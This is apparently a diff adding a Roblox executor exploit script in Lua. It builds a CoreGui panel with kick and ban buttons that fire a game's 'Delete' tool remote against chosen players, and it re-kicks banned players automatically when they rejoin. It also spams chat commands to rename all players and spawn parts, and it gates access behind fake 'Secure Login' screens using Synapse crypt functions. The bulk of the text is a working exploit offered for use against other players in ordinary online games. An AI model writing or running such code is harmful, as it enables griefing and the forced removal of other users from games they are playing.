+elseif del.Visible == true then KickPerson.Visible = false del.Visible = false remover.Visible = false tweensmall:Play() remover.Visible = true weeb.Visible = true ext.Visible = true ban.Visible = true KickPerson.Text = '[Player]'
+end
+end)
+
+BanPlayer.MouseButton1Click:connect(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5)
+local target = GetPlayer(BanPerson.Text)
+if target then
+table.insert(BanLand,target.Name)
+game.Players.LocalPlayer.Backpack.Delete.delete:FireServer(target)
+BanPerson.Text = "Banned! Player Name (" .. target.Name .. ')'
+print("Banned! Player Name (" .. target.Name .. ')')
+end
+else
+local target = GetPlayer(BanPerson.Text)
+if target then
+table.insert(BanLand,target.Name)
+game.Players.LocalPlayer.Backpack.Delete.delete:FireServer(target)
+BanPerson.Text = "Banned! Player Name (" .. target.Name .. ')'
+print("Banned! Player Name (" .. target.Name .. ')')
+end
+end
+end)
+
+local frt= Frame
+local goalee= {}
+goalee.Size = UDim2.new(0,200,0,50)
+local goalee2 ={}
+goalee2.Size =  UDim2.new(0,200,0,165)
+local tweenInfors = TweenInfo.new(.35)
+local tweenmin = TweenService:Create(frt, tweenInfors, goalee)
+local tweenreg = TweenService:Create(frt, tweenInfors, goalee2)
+
+local can = true
+function minimizer(a)
+if a == '1' then
+minsnd()
+Person.Visible = false
+Insane.Visible = false
+local tob = {weeb,workin,remover,ban,ext}
+local tob2 = {but1,but2,but3,but4,but5,but6,but7,but8,but9,but10}
+for i,v in pairs(tob) do
+v.Visible = false
+end
+if but1.Visible == true then
+for i,v in pairs(tob2) do
+v.Visible = false
+end
+end
+if del.Visible == true then 
+KickPerson.Visible = false del.Visible = false 
+end
+if KickPlayer.Visible == true then
+KickPlayer.Visible = false KickPerson.Visible= false
+end
+if BanPerson.Visible == true then
+BanPerson.Visible = false BanPlayer.Visible= false
+end
+tweenmin:Play()
+porl()
+else
+porl()
+minsnd()
+tweenreg:Play()
+local tob = {weeb,workin,remover,ext,ban}
+for i,v in pairs(tob) do
+v.Visible = true
+end
+tweenreg:Play()
+wait(.35)
+Person.Visible = true
+Insane.Visible = true
+end
+end
+
+minimize.MouseButton1Click:Connect(function()
+if can == true then minimize.Visible = false minimizer('1') minimize.Visible = true can = false
+else
+minimize.Visible = false
+minimizer('2')
+minimize.Visible = true
+can = true
+end
+end)
+
+del.MouseButton1Down:connect(function()
+local text = KickPerson.Text
+for i = 1, #text do
+    game.Players:Chat("name all " .. string.sub(text, 1, i))
+    wait(0.04) --This is the speed of the text
+end
+wait(1)
+local nt = KickPerson.Text
+for i = 1, #text do
+    game.Players:Chat("name all " .. nt:reverse():sub(i):reverse())
+    wait(0.04) --This is the speed of the text
+end
+wait(.25)
+ game.Players:Chat("unname all")
+end)
+local val
+
+local function dec()
+local ttr = {1.05,1.1,1.25,1.5,2,2.15,2.25,2.5,3}
+local meme = ttr[math.random(1,#ttr)]
+val = meme
+return(val)
+end
+
+function lasscheck(enterPressed)
+if KickPlayer.Visible == true then
+EnterKick(enterPressed)
+end
+end
+
+function lasscheck2(enterPressed)
+if del.Visible == true then 
+if enterPressed then 
+local text = KickPerson.Text
+for i = 1, #text do
+    game.Players:Chat("name all " .. string.sub(text, 1, i))
+    wait(0.04) --This is the speed of the text
+end
+wait(1)
+local nt = KickPerson.Text
+for i = 1, #text do
+    game.Players:Chat("name all " .. nt:reverse():sub(i):reverse())
+    wait(0.04) --This is the speed of the text
+end
+wait(.25)
+game.Players:Chat("unname all")
+end
+end
+end
+
+
+KickPerson.FocusLost:Connect(function(enterPressed)
+if _G.EnterToExecute == true then
+lasscheck(enterPressed)
+lasscheck2(enterPressed)
+end
+end)
+
+KickPlayer.MouseButton1Down:connect(function()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5)
+local target = GetPlayer(KickPerson.Text)
+if target then
+game.Players.LocalPlayer.Backpack.Delete.delete:FireServer(target)
+KickPerson.Text = "Kicked ! Player Name (" .. target.Name .. ')'
+print("Kicked ! Player Name (" .. target.Name .. ')')
+end
+else
+local target = GetPlayer(KickPerson.Text)
+if target then
+game.Players.LocalPlayer.Backpack.Delete.delete:FireServer(target)
+KickPerson.Text = "Kicked ! Player Name (" .. target.Name .. ')'
+print("Kicked ! Player Name (" .. target.Name .. ')')
+end
+end
+end)
+
+workin.MouseButton1Click:Connect(function()
+if Fr2.Visible == true then Fr2.Visible = false 
+else Fr2.Visible = true
+end
+end)
+
+sp.MouseButton1Click:Connect(function()
+game:GetService('Players'):Chat('part/' .. r1.Text.. '/' .. r2.Text .. '/' .. r3.Text)
+end)
+
+rand.MouseButton1Click:Connect(function()
+if _G.PartDecimalsEnabled == true then
+dec()
+wait()
+local v1 = math.random(1,10)/val
+local v2= math.random(1,10)/val
+local v3 = math.random(1,10)/val
+game:GetService('Players'):Chat('part/' .. v1.. '/' .. v2 .. '/' .. v3)
+end
+end)
+
+Close.MouseButton1Click:Connect(function()
+flagged = false
+CCSecured = true
+sndshutdown:Play()
+if workspace:FindFirstChild('Core') then workspace.Core:Destroy() end
+wait()
+SGui:Destroy()
+local tr, dump2 = pcall(function()
+sndshutdown:Play()
+wait(2)
+sndshutdown:Destroy()
+end)
+end)
+
+local changecolors = coroutine.wrap(function()
+	while true do
+	    for i = 0,1,0.01 do
+	        Title.TextColor3 = Color3.fromHSV(i,1,1)
+			Person.TextColor3 = Color3.fromHSV(i,1,1)
+			Person.PlaceholderColor3 = Color3.fromHSV(i,1,1)
+			KickPerson.TextColor3 = Color3.fromHSV(i,1,1)
+			BanPerson.TextColor3 = Color3.fromHSV(i,1,1)
+			but1.TextColor3 = Color3.fromHSV(i,1,1)
+			but2.TextColor3 = Color3.fromHSV(i,1,1)
+			but3.TextColor3 = Color3.fromHSV(i,1,1)
+			but4.TextColor3 = Color3.fromHSV(i,1,1)
+			but5.TextColor3 = Color3.fromHSV(i,1,1)
+			but6.TextColor3 = Color3.fromHSV(i,1,1)
+			but7.TextColor3 = Color3.fromHSV(i,1,1)
+			but8.TextColor3 = Color3.fromHSV(i,1,1)
+			but10.TextColor3 = Color3.fromHSV(i,1,1)
+	        wait(0.1)
+	    end
+	end
+end)
+changecolors()
+
+function gmbt()
+if not game.Players.LocalPlayer.Backpack:FindFirstChild("Delete") then game:GetService('Players'):Chat(':btools me')
+wait(.5)
+end
+end
+
+game:GetService('Players').PlayerAdded:Connect(function(newplr)
+for _,bans in pairs(BanLand) do
+if newplr.Name == bans then
+gmbt()
+game.Players.LocalPlayer.Backpack['Delete']['delete']:FireServer(newplr)
+warn('Player (' .. newplr.Name .. ') tried to rejoin.')
+end
+end
+end)
+end
+
+
+function LOGIN1()
+
+local lang = 'English'
+local y = true
+local plring = game:GetService('Players').LocalPlayer.Name
+local sor = game:GetService("Players")
+local rep = game:GetService("ReplicatedStorage")
+local work = game:GetService("Workspace")
+local twrn = game:GetService('TweenService')
+local gui2 = Instance.new('ScreenGui', game:GetService('CoreGui'));gui2.Name = 'LogMeIn'
+local inputframe = Instance.new('Frame')
+local LoginInfo = Instance.new('TextLabel', inputframe)
+local Username = Instance.new('TextBox', inputframe)
+local pwinput = Instance.new('TextBox', inputframe)
+local submit = Instance.new('TextButton', inputframe)
+local scalar2 = Instance.new('UIScale', gui2)
+local loadbar = Instance.new('TextLabel', inputframe)
+local loadback = Instance.new('TextLabel', inputframe)
+local loadbarinf = Instance.new('TextLabel', inputframe)
+local loadimgCMI = Instance.new('ImageLabel', inputframe)
+loadbar.Visible = false
+loadback.Visible = false
+loadbarinf.Visible = false
+
+local tsfx = coroutine.wrap(function()
+while y == true do
+wait(.25)
+loadbarinf.Text = 'Loading.'
+wait(.25)
+loadbarinf.Text = 'Loading..'
+wait(.25)
+loadbarinf.Text = 'Loading...'
+wait(.25)
+end
+loadbarinf.Text = 'Logged in <c6>(User)</c>'
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Secure Login V1";
+		Text = "Welcome back "..plring..'!';
+		Duration = 4
+	})
+end)
+
+local r = {inputframe,LoginInfo,Username,pwinput,submit,loadback,loadbar}
+local function SD()
+wait()
+for _,meme in pairs(r) do meme.Visible = false
+backupat = 0
+wait() gui2:Destroy()
+if game:GetService('SoundService'):FindFirstChild('Value') then game:GetService('SoundService').Value:Destroy() end
+end
+end
+--Core Login Objs
+loadbar.Text = ''
+loadbar.BorderSizePixel = 0
+loadbar.Size = UDim2.new(0,0,0,25)
+loadbar.Position =UDim2.new(.5,-75,1,-50)
+loadbar.BackgroundColor3 = Color3.new(0,0,0)
+loadbar.ZIndex = 1
+
+loadback.Text = ''
+loadback.BorderSizePixel = 0
+loadback.Size = UDim2.new(0,155,0,30)
+loadback.Position = UDim2.new(.5,-77.5,1,-52)
+loadback.BackgroundColor3 = Color3.new(0,0,0)
+loadback.BackgroundTransparency = .15
+loadback.BorderSizePixel = 1.25
+loadback.BorderColor3 = Color3.new(0,0,0)
+loadback.ZIndex = 0
+
+loadbarinf.Text = 'Loading.'
+loadbarinf.BorderSizePixel = 0
+loadbarinf.Font = 12
+loadbarinf.TextScaled = true
+loadbarinf.Size = UDim2.new(0,125,0,30)
+loadbarinf.Position = UDim2.new(.5,-62.5,1,-85)
+loadbarinf.BackgroundColor3 = Color3.new(0,0,0)
+loadbarinf.BackgroundTransparency =  .5
+loadbarinf.BorderSizePixel = 0
+loadbarinf.BorderColor3 = Color3.new(0,0,0)
+
+loadimgCMI.Name = '..'
+loadimgCMI.BorderSizePixel = 0
+loadimgCMI.BackgroundTransparency = 1
+loadimgCMI.Size = UDim2.new(0,40,0,40)
+loadimgCMI.Position = UDim2.new(.5, -20,.5,35)
+loadimgCMI.Image = 'rbxassetid://638630175'
+loadimgCMI.ImageColor3 = Color3.fromRGB(255,255,255)
+loadimgCMI.Visible = false
+loadimgCMI.ZIndex = 1
+
+local multiplier = 6
+local min = 4
+local function GetRotation(alpha)
+	local cos = math.cos(math.rad(alpha))
+	return cos * multiplier + min
+end
+local spin = coroutine.wrap(function()
+while gui2.Parent ~= nil do
+if loadimgCMI.Rotation > 10000 then
+loadimgCMI.Rotation = 0
+end
+	for a = 0, 90 do
+		loadimgCMI.Rotation = loadimgCMI.Rotation + GetRotation(a)
+		game:GetService("RunService").Heartbeat:Wait()
+	end
+	for a = 90, 0, -1 do
+		loadimgCMI.Rotation = loadimgCMI.Rotation + GetRotation(a)
+		game:GetService("RunService").Heartbeat:Wait()
+	end
+	wait()
+end
+end)
+spin()
+
+
+local rb = {Username,pwinput,submit}
+local function playanim()
+for _,rbs in pairs(rb) do rbs.Visible = false end
+loadbarinf.Visible = true
+if _G.LoadStyle == 1 then
+loadbar.Visible = true
+loadback.Visible = true
+local willTween = loadbar:TweenSize(
+	UDim2.new(0, 150, 0, 25),  -- endSize (required)
+	Enum.EasingDirection.In,    -- easingDirection (default Out)
+	Enum.EasingStyle.Quad,      -- easingStyle (default Quad)
+	4                        -- time (default: 1)                      -- should this tween override ones in-progress? (default: false)                  -- a function to call when the tween completes (default: nil)
+	)
+elseif _G.LoadStyle == 2 then
+loadimgCMI.Visible = true
+end
+wait() tsfx()
+wait(4) y = false loadimgCMI.Visible = false wait(1.5) CR=true wait(.5) SD() wait(.1) CollectData()
+end
+
+LoginInfo.Font = 12
+LoginInfo.Position = UDim2.new(0, 0, 0, -5)
+LoginInfo.BackgroundColor3 = Color3.new(0, 0, 0)
+LoginInfo.BackgroundTransparency = 0.5
+LoginInfo.Size = UDim2.new(0, 200, 0, 50)
+LoginInfo.Name = 'INFO'
+LoginInfo.TextScaled = true
+LoginInfo.BorderSizePixel = 0
+LoginInfo.Text = "Secure Login v1.0"
+LoginInfo.ZIndex = 2
+
+
+inputframe.Parent = gui2
+inputframe.BackgroundColor3 = Color3.new(0, 0, 0)
+inputframe.BackgroundTransparency = 0.5
+inputframe.BorderSizePixel = 0
+inputframe.Active = true
+inputframe.Name = 'LoginFrame'
+inputframe.Draggable = true
+inputframe.Size = UDim2.new(0, 200, 0, 165)
+inputframe.Position = UDim2.new(.25, -100, .5, -82.5)
+inputframe.ZIndex = 0
+
+
+Username.Text = "Username"
+Username.TextColor3 = Color3.new(200, 0, 0)
+Username.BackgroundColor3 = Color3.new(0, 0, 0)
+Username.BackgroundTransparency = 0.5
+Username.Font = 12
+Username.Name = 'タイプボックス'
+Username.BorderSizePixel = 2
+Username.Size = UDim2.new(0, 150, 0, 35)
+Username.Position = UDim2.new(0, 25, 0, 50)
+Username.TextScaled = true
+
+Username.FocusLost:Connect(function()
+if _G.PushSecurity == true then
+Username.Text = 'Username'
+end
+if _G.ClearOnTouch == false then
+if Username.Text ~= 'Username' then
+Username.ClearTextOnFocus = false
+elseif Username.Text ==  'Username' then
+Username.ClearTextOnFocus = true
+end
+end
+end)
+
+pwinput.BackgroundColor3 = Color3.new(0, 0 ,0)
+pwinput.BackgroundTransparency = 0.5
+pwinput.Text = "Password"
+pwinput.Name = 'チャット（M）'
+pwinput.TextColor3 = Color3.new(200, 0, 0)
+pwinput.BorderSizePixel = 2
+pwinput.Font = 12
+pwinput.TextScaled = true
+pwinput.Position = UDim2.new(0, 25, 0, 90)
+pwinput.Size = UDim2.new(0, 150, 0, 35)
+
+
+
+pwinput.FocusLost:Connect(function()
+if _G.PushSecurity == true then
+pwinput.Text = 'Password'
+end
+if _G.ClearOnTouch == false then
+if pwinput.Text ~= 'Password' then
+pwinput.ClearTextOnFocus = false
+elseif pwinput.Text ==  'Password' then
+pwinput.ClearTextOnFocus = true
+end
+end
+end)
+
+submit.BackgroundColor3 = Color3.new(0, 0 ,0)
+submit.BackgroundTransparency = 0.5
+submit.Text = "Login"
+submit.Name = 'LoginFunction'
+submit.TextColor3 = Color3.new(200, 0, 0)
+submit.BorderSizePixel = 2
+submit.Font = 12
+submit.TextScaled = true
+submit.Position = UDim2.new(0, 50, 0, 135)
+submit.Size = UDim2.new(0, 100, 0, 25)
+scalar2.Scale = 1.3
+
+
+function addattempt()
+attempte = attempts + 1
+backupat = backupat + 1
+end
+
+function checkattempts()
+if attempts >= 3 then CR =true wait(.5) SD() warn('Session Logoff')
+end
+end
+
+--Disabled due to double-executing triggering false positive
+function kl()
+--[[if lang == 'Japanese' then
+game:GetService('Players').LocalPlayer:Kick('矛盾が見つかりました。')
+elseif lang == 'English' then
+game:GetService('Players').LocalPlayer:Kick('(Secure Login) - Security Compromised')
+end]]
+end
+
+function backup()
+wait(1)
+if attempts ~= backupat then 
+kl()
+end
+end
+
+local function convert(pass, tblnum)
+    return string.char((string.byte(pass) -30+ (-tblnum or tblnum)) % 34+ 60)
+end
+
+local function checkb(b)
+if convert(pwinput.Text,295) == string.char(zen) then
+if string.char(zen) == string.gsub('workspace', 'orkspace', '') then --2fa Var
+CR = true wait(.25) playanim()
+addattempt() wait(.6) checkattempts()
+end
+end
+end
+
+function checker(a)
+if a == game:GetService('Players').LocalPlayer.Name then checkb(pwinput.Text)
+else addattempt() wait(.6) checkattempts()
+end
+end
+
+submit.MouseButton1Click:Connect(function()
+if Username.Text ~= nil then
+if pwinput.Text ~= nil then
+checker(Username.Text)
+else
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Secure Login V1";
+		Text = "Enter Valid Credentials";
+		Duration = .75
+	})
+end
+end
+end)
+
+local crtl = coroutine.wrap(function()
+	while inputframe.Visible == true do
+	    for i = 0,1,0.01 do
+	        LoginInfo.TextColor3 = Color3.fromHSV(i,1,1)
+			submit.TextColor3=Color3.fromHSV(i,1,1)
+			loadbar.BackgroundColor3= Color3.fromHSV(i,1,1)
+			loadbarinf.TextColor3 =Color3.fromHSV(i,1,1)
+			loadback.BorderColor3=Color3.fromHSV(i,1,1)
+			loadimgCMI.ImageColor3 = Color3.fromHSV(i,1,1)
+	        wait(0.1)
+	    end
+	end
+end)
+crtl()
+end
+
+
+function LOGIN2()
+
+local lang = 'English'
+local y = true
+local plring = game:GetService('Players').LocalPlayer.Name
+local sor = game:GetService("Players")
+local rep = game:GetService("ReplicatedStorage")
+local work = game:GetService("Workspace")
+local twrn = game:GetService('TweenService')
+
+
+local Gui3 = Instance.new('ScreenGui', game:GetService('CoreGui'))
+Gui3.Name = 'Secure Login v2.5'
+local MainF = Instance.new('Frame', Gui3)
+local t1 = Instance.new('TextLabel', MainF)
+local t2 = Instance.new('TextLabel', t1)
+local t3 = Instance.new('TextLabel', t1)
+local t4 = Instance.new('TextLabel', t1)
+local pwframe = Instance.new('Frame', MainF)
+local pwinput2 = Instance.new('TextBox', pwframe)
+local userframe = Instance.new('Frame', MainF)
+local Username2 = Instance.new('TextBox', userframe)
+local TitlePw = Instance.new('TextLabel', pwinput2)
+local TitleUser = Instance.new('TextLabel', Username2)
+local keyframe = Instance.new('Frame', MainF)
+local TitleV = Instance.new('TextLabel', keyframe)
+local submitter = Instance.new('TextButton', MainF)
+local loadimgCMI = Instance.new('ImageLabel', MainF)
+local placeholder = Instance.new('TextLabel',MainF)
+local VerifyKey = Instance.new('TextBox', keyframe)
+local blr = Instance.new('BlurEffect', game.Lighting)
+blr.Size = 3.5
+blr.Enabled = true
+
+Gui3.DescendantRemoving:Connect(function()
+if not CR then CR = true
+wait()
+Gui3:Destroy()
+local Mercy,Faith = pcall(function()
+blr:Destroy()
+end)
+warn('Secure Login Self-Terminated')
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Secure Login";
+		Text = "UI Change Was Detected";
+	})
+end
+end)
+
+local r = {MainF,Username2,pwinput2,submitter,t1,VerifyKey}
+local function SD()
+wait()
+for _,meme in pairs(r) do meme.Visible = false
+backupat = 0
+wait() Gui3:Destroy()
+blr.Enabled = false
+blr:Destroy()
+if game:GetService('SoundService'):FindFirstChild('Value') then game:GetService('SoundService').Value:Destroy() end
+end
+end
+
+
+MainF.ZIndex = 0
+MainF.BackgroundColor3 = Color3.fromRGB(69, 77, 93)
+MainF.BorderSizePixel = 0
+MainF.Size = UDim2.new(1,0,1,36)
+MainF.Position = UDim2.new(0,0,0,-36)
+MainF.Transparency = 1
+
+--[[MainF.Changed:Connect(function()
+if MainF.Visible == false and CR == false then
+game:GetService('Players').LocalPlayer:Kick('Attempted to modify LOGIN.EXE')
+end
+end)--]]
+
+t1.Name = 'Center'
+t1.Text = 'Secure Login'
+t1.TextSize = 40
+t1.Size = UDim2.new(0,300,0,100)
+t1.Position = UDim2.new(0.5, -150,-1, -25)
+t1.Font = 19
+t1.TextColor3 = Color3.new(0,0,0)
+t1.TextTransparency = 1
+t1.BackgroundTransparency = 1
+t1.BorderSizePixel = 0
+t1.ZIndex = 2
+
+t2.Name = 'Left'
+t2.Text = 'Secure Login'
+t2.TextSize = 40
+t2.Size = UDim2.new(0,300,0,100)
+t2.Position = UDim2.new(0,-1,-1,0)
+t2.Font = 19
+t2.TextColor3 = Color3.new(0,0,0)
+t2.TextTransparency = .65
+t2.BackgroundTransparency = 1
+t2.BorderSizePixel = 0
+t2.ZIndex = 1
+
+t3.Name = 'Right'
+t3.Text = 'Secure Login'
+t3.TextSize = 40
+t3.Size = UDim2.new(0,300,0,100)
+t3.Position = UDim2.new(0,3,-1,0)
+t3.Font = 19
+t3.TextColor3 = Color3.new(0,0,0)
+t3.TextTransparency = .25
+t3.BackgroundTransparency = 1
+t3.BorderSizePixel = 0
+t3.ZIndex = 1
+
+t4.Name = 'Front'
+t4.Text = 'Secure Login'
+t4.TextSize = 40
+t4.Size = UDim2.new(0,300,0,100)
+t4.Position = UDim2.new(0,-1,-1,0)
+t4.Font = 19
+t4.TextColor3 = Color3.fromRGB(255,255,255)
+t4.TextTransparency = .015
+t4.BackgroundTransparency = 1
+t4.BorderSizePixel = 0
+t4.ZIndex = 1
+
+local titleS= coroutine.wrap(function()
+while Gui3.Parent ~= nil do
+	 for i = 0,1,0.01 do
+	        t4.TextColor3 = Color3.fromHSV(i,1,1)
+	        wait(0.1)
+	   end
+	end
+end)
+
+local objs2 = {t1,t2,t3,t4}
+function ts()
+t1:TweenPosition(UDim2.new(0.3, -150,0.25, -25),0,6,1)
+t2:TweenPosition(UDim2.new(0,-1,0,0),0,6,1)
+t3:TweenPosition(UDim2.new(0,3,0,0),0,6,1)
+t4:TweenPosition(UDim2.new(0,-1,0,0),0,6,1)
+end
+ts()
+titleS()
+userframe.BackgroundColor3 = Color3.new(0,0,0)
+userframe.BorderSizePixel = 0
+userframe.Size = UDim2.new(0, 202,0, 52)
+userframe.Position = UDim2.new(0.35, -100,0.4, -25)
+userframe.ZIndex = 0
+
+TitleUser.Text = 'Username:'
+TitleUser.BackgroundTransparency = 1
+TitleUser.Size = UDim2.new(0, 200,0, 50)
+TitleUser.Position = UDim2.new(0, -180,0, 0)
+TitleUser.ZIndex = 1
+TitleUser.TextColor3 = Color3.new(255,255,255)
+TitleUser.Font = 19
+TitleUser.TextSize = 30
+
+Username2.TextColor3 = Color3.fromRGB(0,225,0)
+Username2.Text = ''
+Username2.Font = 19
+Username2.TextScaled = true
+Username2.Size = UDim2.new(0, 200,0, 50)
+Username2.Position = UDim2.new(0.5, -100,0.5, -25)
+Username2.BackgroundTransparency = .4
+Username2.BorderSizePixel = 0
+Username2.BackgroundColor3 = Color3.fromRGB(70,70,70)
+
+pwframe.BackgroundColor3 = Color3.new(0,0,0)
+pwframe.BorderSizePixel = 0
+pwframe.Size = UDim2.new(0, 202,0, 52)
+pwframe.Position = UDim2.new(0.35, -100,0.52, -25)
+pwframe.ZIndex = 0
+
+keyframe.BackgroundColor3 = Color3.new(0,0,0)
+keyframe.BorderSizePixel = 0
+keyframe.Size = UDim2.new(0, 202,0, 52)
+keyframe.Position = UDim2.new(0.35, -100,0.64, -25)
+keyframe.ZIndex = 0
+
+TitlePw.Text = 'Password:'
+TitlePw.BackgroundTransparency = 1
+TitlePw.Size = UDim2.new(0, 200,0, 50)
+TitlePw.Position = UDim2.new(0, -175,0, 0)
+TitlePw.ZIndex = 1
+TitlePw.TextColor3 = Color3.new(255,255,255)
+TitlePw.Font = 19
+TitlePw.TextSize = 30
+
+pwinput2.TextColor3 = Color3.fromRGB(0,225,0)
+pwinput2.Text = ''
+pwinput2.Font = 19
+pwinput2.TextScaled = true
+pwinput2.Size = UDim2.new(0, 200,0, 50)
+pwinput2.Position = UDim2.new(0.5, -100,0.5, -25)
+pwinput2.BackgroundTransparency = .4
+pwinput2.BorderSizePixel = 0
+pwinput2.BackgroundColor3 = Color3.fromRGB(70,70,70)
+
+
+TitleV.Text = 'Encryption Key:'
+TitleV.BackgroundTransparency = 1
+TitleV.Size = UDim2.new(0, 200,0, 50)
+TitleV.Position = UDim2.new(0, -200,0, 0)
+TitleV.ZIndex = 1
+TitleV.TextColor3 = Color3.new(255,255,255)
+TitleV.Font = 19
+TitleV.TextScaled = true
+
+VerifyKey.TextColor3 = Color3.fromRGB(0,225,0)
+VerifyKey.Text = ''
+VerifyKey.Font = 19
+VerifyKey.TextScaled = true
+VerifyKey.Size = UDim2.new(0, 200,0, 50)
+VerifyKey.Position = UDim2.new(0.5, -100,0.5, -25)
+VerifyKey.BackgroundTransparency = .4
+VerifyKey.BorderSizePixel = 0
+VerifyKey.BackgroundColor3 = Color3.fromRGB(70,70,70)
+
+
+placeholder.TextColor3 = Color3.new(255,255,255)
+placeholder.Text = 'Loading...'
+placeholder.TextScaled = true
+placeholder.Visible =false
+placeholder.Font = 19
+placeholder.BackgroundTransparency = 1
+placeholder.BorderSizePixel = 0
+placeholder.Size = UDim2.new(0,300,0,60)
+placeholder.Position = UDim2.new(.315,-150,0.415,-30)
+
+submitter.BackgroundColor3 = Color3.new(0,0,0)
+submitter.BackgroundTransparency = .6
+submitter.Size = UDim2.new(0, 200,0, 50)
+submitter.Position = UDim2.new(0.3, -100,0.7, 0)
+submitter.ZIndex = 1
+submitter.TextColor3 = Color3.fromRGB(255,255,255)
+submitter.Text = 'Login'
+submitter.Font = 19
+submitter.TextScaled = true
+
+loadimgCMI.Name = '..'
+loadimgCMI.BorderSizePixel = 0
+loadimgCMI.BackgroundTransparency = 1
+loadimgCMI.Size = UDim2.new(0,40,0,40)
+loadimgCMI.Position = UDim2.new(0.45, -20,0.6, -20)
+loadimgCMI.Image = 'rbxassetid://638630175'
+loadimgCMI.ImageColor3 = Color3.fromRGB(255,255,255)
+loadimgCMI.Visible = false
+loadimgCMI.ZIndex = 1
+
+local multiplier = 6
+local min = 4
+local function GetRotation(alpha)
+	local cos = math.cos(math.rad(alpha))
+	return cos * multiplier + min
+end
+local spin = coroutine.wrap(function()
+while Gui3.Parent ~= nil do
+if loadimgCMI.Rotation > 10000 then
+loadimgCMI.Rotation = 0
+end
+	for a = 0, 90 do
+		loadimgCMI.Rotation = loadimgCMI.Rotation + GetRotation(a)
+		game:GetService("RunService").Heartbeat:Wait()
+	end
+	for a = 90, 0, -1 do
+		loadimgCMI.Rotation = loadimgCMI.Rotation + GetRotation(a)
+		game:GetService("RunService").Heartbeat:Wait()
+	end
+	wait()
+end
+end)
+spin()
+
+local rb = {Username2,pwinput2,submitter,VerifyKey}
+local function playanim()
+loadimgCMI.Visible = true
+Username2.Visible = false
+pwinput2.Visible = false
+placeholder.Visible = true
+pwframe.Visible = false
+TitlePw.Visible = false
+TitleUser.Visible = false
+userframe.Visible = false
+submitter.Visible = false
+VerifyKey.Visible = false
+TitleV.Visible = false
+keyframe.Visible = false
+wait(4)loadimgCMI.Visible = false wait(.75) CR=true wait(.15) SD() CollectData()
+end
+
+Username2.FocusLost:Connect(function()
+if _G.PushSecurity == true then
+Username2.Text = 'Username'
+end
+if _G.ClearOnTouch == false then
+if Username2.Text ~= 'Username' then
+Username2.ClearTextOnFocus = false
+elseif Username2.Text ==  'Username' then
+Username2.ClearTextOnFocus = true
+end
+end
+end)
+
+pwinput2.FocusLost:Connect(function()
+if _G.PushSecurity == true then
+pwinput2.Text = 'Password'
+end
+if _G.ClearOnTouch == false then
+if pwinput2.Text ~= 'Password' then
+pwinput2.ClearTextOnFocus = false
+elseif pwinput2.Text ==  'Password' then
+pwinput2.ClearTextOnFocus = true
+end
+end
+end)
+
+function addattempt()
+attempts = attempts + 1
+backupat = backupat + 1
+end
+
+function checkattempts()
+if attempts >= 3 then CR =true wait(.5) SD() warn('Session Logoff')
+end
+end
+
+function kl()
+end
+
+function backup()
+wait(1)
+if attempts ~= backupat then 
+kl()
+end
+end
+
+local function convert(pass, tblnum)
+    return string.char((string.byte(pass) -30+ (-tblnum or tblnum)) % 34+ 60)
+end
+
+local hash = 'TGQ4TXAzVmpJZWdUaFArc3oyaXRDU2xrcCtNS1ovQT18bmNBRU5vUXZwWWhDRTh1RQ=='
+local function checkb(b)
+if pwinput2.Text == syn.crypt.decrypt(hash, VerifyKey.Text) then--2fa Var
+CR = true wait(.25) playanim()
+addattempt() wait(.6) checkattempts()
+end
+end
+
+function checker(a)
+if a == 'Administrator' then checkb(pwinput2.Text)
+else addattempt() wait(.6) checkattempts()
+end
+end
+
+submitter.MouseButton1Click:Connect(function()
+if Username2.Text ~= nil then
+if pwinput2.Text ~= nil then
+checker(Username2.Text)
+else
+	game:GetService("StarterGui"):SetCore("SendNotification", {
+		Title = "Secure Login V2";
+		Text = "Enter Valid Credentials";
+		Duration = .75
+	})
+end
+end
+end)
+end
+
+if _G.LoginStyle == 1 then
+LOGIN1()
+else 
+LOGIN2() 
+end
+end
+
+function DetectedOld()
+local GuiInstance = Instance.new('ScreenGui', game:GetService('CoreGui'))
+GuiInstance.Name = 'Warning'
+local FrameInstance = Instance.new('Frame', GuiInstance)
+local Cl1 = Instance.new('TextButton', FrameInstance)
+Cl1.Name = 'Agree'
+local Cl2 = Instance.new('TextButton', FrameInstance)
+Cl2.Name = 'Disagree'
+local TitleOld = Instance.new('TextLabel', FrameInstance)
+FrameInstance.Size = UDim2.new(0,200,0,135)
+FrameInstance.Position = UDim2.new(0.15,0,.4,0)
+FrameInstance.BackgroundColor3 = Color3.new(0,0,0)
+FrameInstance.BackgroundTransparency = 0.5
+FrameInstance.BorderSizePixel = 0
+FrameInstance.Active = true
+FrameInstance.Draggable = true
+FrameInstance.Name = ''
+TitleOld.Size = UDim2.new(0,200,0,50)
+TitleOld.Text = 'Outdated Script, Update?'
+TitleOld.TextScaled = true
+TitleOld.Font = '12'
+TitleOld.TextColor3 = Color3.new(255,0,0)
+TitleOld.BackgroundColor3 = Color3.new(0,0,0)
+TitleOld.BackgroundTransparency = 0.5
+Cl1.BackgroundColor3 = Color3.new(0, 0 ,0)
+Cl1.BackgroundTransparency = 0.5
+Cl1.Text = 'Yes'
+Cl1.Name = 'KC Update'
+Cl1.TextColor3 = Color3.new(200, 0, 0)
+Cl1.BorderSizePixel = 2
+Cl1.Font = 12
+Cl1.TextScaled = true
+Cl1.Position = UDim2.new(.1,0, .6, -12.5)
+Cl1.Size = UDim2.new(0, 75, 0, 40)
+Cl2.BackgroundColor3 = Color3.new(0, 0 ,0)
+Cl2.BackgroundTransparency = 0.5
+Cl2.Text = 'No'
+Cl2.Name = 'KC Postpone'
+Cl2.TextColor3 = Color3.new(200, 0, 0)
+Cl2.BorderSizePixel = 2
+Cl2.Font = 12
+Cl2.TextScaled = true
+Cl2.Position = UDim2.new(.55,0, .6, -12.5)
+Cl2.Size = UDim2.new(0, 75, 0, 40)
+Cl1.MouseButton1Click:Connect(function()
+GuiInstance:Destroy()
+NewVersion()
+end)
+Cl2.MouseButton1Click:Connect(function()
+GuiInstance:Destroy()
+CurrentVersion()
+end)
+end
+
+function TrialOver(args)
+local FinalG = Instance.new('ScreenGui', game:GetService('CoreGui'))
+FinalG.Name = ''
+local FinalFrame = Instance.new('Frame', FinalG)
+FinalFrame.Name = ''
+FinalFrame.Size = UDim2.new(0,400,0,350)
